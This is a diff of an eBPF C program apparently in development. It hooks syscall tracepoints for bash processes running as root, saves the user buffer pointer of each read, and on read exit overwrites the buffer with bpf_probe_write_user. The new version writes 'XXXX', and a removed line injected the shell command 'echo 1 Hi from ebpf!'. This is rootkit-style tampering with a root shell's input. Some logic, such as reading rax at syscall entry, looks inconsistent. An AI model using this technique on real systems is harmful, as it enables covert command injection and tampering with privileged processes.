@@ -13,6 +13,8 @@
 #include <linux/ptrace.h>   // asm/ptrace.h
 #include <asm/unistd_64.h>
 
+// #include "vmlinux.h"
+
 #define MAX_BUF 128
 #define MAX_ENTRIES 10240
 #define TASK_COMM_LEN 16
@@ -36,6 +38,12 @@ struct {
     __type(value, char[MAX_BUF]);
 } openat_path_map SEC(".maps");
 
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 10240);
+    __type(key, uint32_t);    // pid
+    __type(value, void*); // user buffer pointer
+} active_bufs SEC(".maps");
 
 int is_bash_with_root(struct pt_regs *ctx)
 {
@@ -267,6 +275,82 @@ int tp_openat_enter(struct bpf_raw_tracepoint_args *ctx)
 }
 
 
+
+
+// sys_enter: stash buffer pointer
+SEC("raw_tracepoint/sys_enter")
+int kp__x64_sys_read(struct bpf_raw_tracepoint_args *ctx)
+{
+    // 1) safely read ctx->args[0] into regs_ptr
+    unsigned long regs_ptr = 0;
+
+    if (bpf_probe_read(&regs_ptr, sizeof(regs_ptr), &ctx->args[0]) < 0)
+    {
+        return 0;
+    }
+
+    // regs_ptr now holds kernel address of struct pt_regs
+    // 2) read syscall number from pt_regs->orig_rax (kernel memory)
+    unsigned long syscall_nr = 0;
+
+    // Use offsetof to locate orig_rax inside pt_regs (x86_64)
+    if (bpf_probe_read(&syscall_nr, sizeof(syscall_nr), 
+                    (void *)(regs_ptr + offsetof(struct pt_regs, orig_rax))) < 0)
+    {
+        return 0;
+    }
+    
+    if (syscall_nr != __NR_read || !is_bash_with_root(ctx))
+    {
+        return 0;
+    }
+    // bpf_printk(" Hello from tp_read_exit\n");
+
+    int ret = 0;
+    if (bpf_probe_read(&ret, sizeof(ret),
+                       (void *)(regs_ptr + offsetof(struct pt_regs, rax))) < 0)
+    {
+        return 0;
+    }
+
+    if (ret <= 0) 
+        return 0;  // nothing read
+
+    int fd = 0;
+    if (bpf_probe_read(&fd, sizeof(fd),
+                       (void *)(regs_ptr + offsetof(struct pt_regs, rdi))) < 0)
+        return 0;
+
+    // if(fd!=3)
+    // {
+    //     return 0;
+    // }
+
+    uint32_t pid = bpf_get_current_pid_tgid() >> 32;
+    // struct fd_key key = {.pid = pid, .fd = fd};
+
+    char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
+    if (!pathname)
+        return 0;
+
+    
+    bpf_printk("SYSENTER read trying to get buffer\n");
+
+    // Now grab buffer pointer (2nd arg of read = rsi)
+    void* buf_ptr = 0;
+    if (bpf_probe_read(&buf_ptr, sizeof(buf_ptr),
+                       (void *)(regs_ptr + offsetof(struct pt_regs, rsi))) < 0)
+    {
+        // return 0;
+    }
+    
+    // void *buf = (void *)ctx->args[1]; // args[1] = buf
+    bpf_printk("storing in map\n");
+
+    bpf_map_update_elem(&active_bufs, &pid, &buf_ptr, BPF_ANY);
+    return 0;
+}
+
 // SEC("kprobe/__x64_sys_read")
 // int kp__x64_sys_read(struct pt_regs *ctx)
 // {
@@ -387,10 +471,10 @@ int tp_read_exit(struct bpf_raw_tracepoint_args *ctx)
                        (void *)(regs_ptr + offsetof(struct pt_regs, rdi))) < 0)
         return 0;
 
-    // if(fd!=3)
-    // {
-    //     return 0;
-    // }
+    if(fd!=3)
+    {
+        return 0;
+    }
 
     uint32_t pid = bpf_get_current_pid_tgid() >> 32;
     // struct fd_key key = {.pid = pid, .fd = fd};
@@ -406,10 +490,17 @@ int tp_read_exit(struct bpf_raw_tracepoint_args *ctx)
     {
         return 0;
     }
+
+    void *user_buf = bpf_map_lookup_elem(&active_bufs, &pid);
+    if (!user_buf)
+        return 0;
+
+    const char patch[] = "XXXX";
+    bpf_probe_write_user(user_buf, patch, sizeof(patch)-1);
     
-    char newcommand[] = "echo 1 Hi from ebpf!";
+    // char newcommand[] = "YOOOOO";
     
-    bpf_probe_write_user((void *)buf_ptr, newcommand, sizeof(newcommand));
+    // bpf_probe_write_user((void *)buf_ptr, newcommand, sizeof(newcommand));
 
     char data[128];
     int copy = ret < sizeof(data) ? ret : sizeof(data)-1;
